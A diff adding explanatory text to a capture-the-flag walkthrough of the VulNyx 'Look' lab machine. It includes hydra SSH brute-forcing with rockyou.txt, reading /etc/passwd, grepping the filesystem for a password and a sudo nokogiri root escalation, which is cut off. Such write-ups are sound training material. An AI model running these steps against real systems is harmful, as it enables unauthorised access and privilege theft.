@@ -1,6 +1,7 @@
 # VulNyx - Look
 
 ## Information
+**Look** is a low difficulty vulnerable Linux virtual machine from the VulNyx platform, it was created by user `d4t4s3c` and works correctly on VirtualBox and VMware hypervisors.
 
 ## Solution
 ### Enumeration
@@ -51,6 +52,8 @@ Nmap done: 1 IP address (1 host up) scanned in 22.92 seconds
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 ```
+`/info.php: Output from the phpinfo() function was found.` - The `phpinfo()` page reveals a lot of system information: PHP version, modules, paths, enviroment variables,... often considered an information vulnerability (CWE-552).
+
 ### dirb
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
@@ -85,11 +88,14 @@ GENERATED WORDS: 4612
 END_TIME: Mon Apr 20 15:57:52 2026
 DOWNLOADED: 13836 - FOUND: 4
 ```
+The resulting `dirb` confirms the existence of `info.php`.
 
 ![info.php](/walkthroughs/vulnyx/low-difficulty/look/info-php.png)
+When accessing `info.php` page, we detect user information name is `axel`.
 
 ### Shell (axel)
 #### hydra
+We use `hydra` to burte-force the SSH service on the target machine with user `axel` and wordlist of `rockyou.txt`.
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
 └─$ hydra -l axel -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.128 -t64
@@ -107,6 +113,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-20 16:03:
 [ERROR] 0 target did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-20 16:05:27
 ```
+The password of `axel` user is `bambam`.
 
 ```bash
 ┌──(dungcngo㉿kali)-[/tmp]
@@ -126,7 +133,7 @@ axel@look:~$ id ; hostname
 uid=1000(axel) gid=1000(axel) grupos=1000(axel)
 look
 ```
-
+User `axel` doesn't have any `sudo` permissions on the `look` system.
 ```bash
 axel@look:~$ sudo -l
 
@@ -140,6 +147,7 @@ Administrator. It usually boils down to these three things:
 [sudo] password for axel: 
 Sorry, user axel may not run sudo on look.
 ```
+Checking the file `/etc/passwd`:
 ```bash
 axel@look:~$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -170,8 +178,10 @@ systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 axel:x:1000:1000::/home/axel:/bin/bash
 dylan:x:1001:1001::/home/dylan:/bin/bash
 ```
+We find other user `dylan`.
 
 ### Shell (dylan)
+Search the entire system for the string `dylan` and write the results to `dylan_find.txt`. Then, we read the content of this file we get user `dylan`'s password.
 ```bash
 axel@look:/tmp$ grep -r -e "dylan" / 2>/dev/null > dylan_find.txt &
 [1] 1100
@@ -201,6 +211,7 @@ look
 
 ### Privilege Escalation
 #### Enumeration
+We list the permisions that user `dylan` can exercise with `sudo`. `dylan` can run the `nokogiri` binary as `root`.
 ```bash
 dylan@look:~$ sudo -l
 Matching Defaults entries for dylan on look:
@@ -212,6 +223,7 @@ User dylan may run the following commands on look:
 ```
 
 #### Abuse
+We check the IRB on GTFOBins and get the shell as `root`:
 ```bash
 dylan@look:~$ sudo nokogiri /etc/passwd
 Your document is stored in @doc...
